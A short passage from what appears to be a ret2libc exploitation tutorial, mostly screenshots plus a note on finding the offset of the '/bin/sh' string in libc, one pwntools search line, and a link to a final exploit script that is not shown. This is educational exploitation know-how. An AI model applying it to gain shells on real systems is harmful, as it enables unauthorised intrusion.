![image](https://user-images.githubusercontent.com/87600765/175791803-7bb12519-e6c3-45c1-8c62-52bda3be56ea.png)

![image](https://user-images.githubusercontent.com/87600765/175791802-640d2d0a-e504-482d-95a6-44c1a4b841fd.png)

It's in fact 60 bytes before `/bin/sh`. However, we don't know whether the string of %s is from position 1 to 8, 2 to 9 or 3 to 10. This means that the offset could be 60, 62 or 64 bytes.
Let's try to trigger an other error message
```py
binsh = next(libc.search(b'/bin/sh')) + 25
``` 

![image](https://user-images.githubusercontent.com/87600765/175791798-a0735803-66d9-41c3-ba77-2de2ea2174b4.png)

![image](https://user-images.githubusercontent.com/87600765/175791795-142405aa-6969-4185-bbdb-65817e45283e.png)


That why we have to put `- 64`.

This the final [exploit](https://github.com/B1rby/Art-of-Exploitation/blob/main/rop/ret2libc/exploit.py).


![image](https://user-images.githubusercontent.com/87600765/175791791-b7f3dfbd-111f-4d1b-bace-1de8fef3f570.png)
